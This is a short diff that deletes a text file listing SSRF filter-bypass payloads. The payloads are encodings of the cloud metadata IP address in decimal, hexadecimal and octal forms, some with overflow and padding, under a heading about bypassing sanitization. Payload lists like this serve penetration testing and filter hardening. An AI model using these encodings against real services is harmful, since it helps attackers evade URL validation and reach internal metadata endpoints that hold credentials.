@@ -1,9 +1,0 @@
-bypassing sanitization by encoding your payloads
-
-http://425.510.425.510 dotted decimal with overflow
-http://2852039166/ dotless decimal
-http://0xA9.0xFE.0xA9.0XFE dotted hexadecimal
-http://0xA9FEA9FE/ dotless hexadecimal
-http://0x41414141A9FEA9FE/ dotless exadecimal with overflow
-http://0251.0376.0251.0376/ dotted octal
-http://0251.00376.000251.0000376 dotted octal with padding
